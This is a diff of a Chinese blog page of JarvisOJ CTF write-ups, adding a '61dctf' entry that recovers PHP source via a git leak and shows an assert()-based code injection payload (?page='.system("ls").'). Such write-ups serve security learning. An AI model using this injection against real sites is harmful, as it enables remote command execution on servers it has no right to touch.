@@ -19,7 +19,7 @@
 <meta property="og:image" content="https://ocgittt.github.io/2019/09/25/JarvisOJ/shieldsbcode.png">
 <meta property="og:image" content="https://ocgittt.github.io/2019/09/25/JarvisOJ/shieldpctf.png">
 <meta property="og:image" content="https://ocgittt.github.io/2019/09/25/JarvisOJ/shieldserialize.png">
-<meta property="og:updated_time" content="2020-06-13T03:54:00.649Z">
+<meta property="og:updated_time" content="2021-04-26T10:16:56.147Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="jarvisOJ">
 <meta name="twitter:description" content="平台地址:https://www.jarvisoj.com/">
@@ -209,6 +209,18 @@
 </blockquote>
 <p>flag在注释里</p>
 <!-- <img src="/2019/09/25/JarvisOJ/shieldflag.png"> -->
+
+
+<h1 id="61dctf"><a href="#61dctf" class="headerlink" title="61dctf"></a>61dctf</h1><p>about页面提示用了git,猜测git泄露</p>
+<p>使用githack工具</p>
+<p>获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"><span class="comment">// $file = "templates/  $page   .php";  #page='.system("ls").'</span></span><br><span class="line"><span class="comment">// strpos('$file', 'templates/'system("ls")'.php') === false"</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">		&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line"></span><br><span class="line">		&lt;title&gt;My PHP Website&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">		&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> /&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt;</span><br><span class="line">			&lt;div class="container"&gt;</span><br><span class="line">		    	&lt;div class="navbar-header"&gt;</span><br><span class="line">		    		&lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt;</span><br><span class="line">		            	&lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt;</span><br><span class="line">		            	&lt;span class="icon-bar"&gt;&lt;/span&gt;</span><br><span class="line">		            	&lt;span class="icon-bar"&gt;&lt;/span&gt;</span><br><span class="line">		            	&lt;span class="icon-bar"&gt;&lt;/span&gt;</span><br><span class="line">		          	&lt;/button&gt;</span><br><span class="line">		          	&lt;a class="navbar-brand" href="#"&gt;Project name&lt;/a&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">		        &lt;div id="navbar" class="collapse navbar-collapse"&gt;</span><br><span class="line">		          	&lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page == "home") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=home"&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page == "about") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=about"&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page == "contact") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=contact"&gt;Contact&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">						&lt;!--&lt;li &lt;?php if ($page == "flag") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</span><br><span class="line">		          	&lt;/ul&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">		    &lt;/div&gt;</span><br><span class="line">		&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">		&lt;div class="container" style="margin-top: 50px"&gt;</span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">				<span class="keyword">require_once</span> $file;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;script src=<span class="string">"http://code.jquery.com/jquery-latest.js"</span> /&gt;</span><br><span class="line">		&lt;script src=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"</span> /&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>php注入:</p>
+<p>payload: <code>?page=&#39;.system(&quot;ls&quot;).&#39;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">"templates/  $page   .php"</span>;  <span class="comment">#page='.system("ls").'</span></span><br><span class="line">strpos(<span class="string">'$file'</span>, <span class="string">'templates/'</span>system(<span class="string">"ls"</span>)<span class="string">'.php'</span>) === <span class="keyword">false</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+
+
       
 
       
@@ -291,18 +303,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/25/xxxxxxCTF/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/02/01/mysql学习/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          NJUPTCTF2019
+          mysql基础
         
       </div>
     </a>
   
   
-    <a href="/2019/08/18/notes/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">notes</div>
+    <a href="/2019/09/25/xxxxxxCTF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">NJUPTCTF2019</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -329,7 +341,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#平台地址-https-www-jarvisoj-com"><span class="toc-number">1.</span> <span class="toc-text">平台地址:https://www.jarvisoj.com/</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#神盾局的秘密"><span class="toc-number">2.</span> <span class="toc-text">神盾局的秘密</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#平台地址-https-www-jarvisoj-com"><span class="toc-number">1.</span> <span class="toc-text">平台地址:https://www.jarvisoj.com/</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#神盾局的秘密"><span class="toc-number">2.</span> <span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61dctf"><span class="toc-number">3.</span> <span class="toc-text">61dctf</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -441,11 +453,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color5">sqli-labs</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sqli-labs-master_les11</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">问题</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -458,14 +478,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">tool</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli-labs</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sqli-labs-master_les11</a>
               </li>
             
             <div class="clearfix"></div>
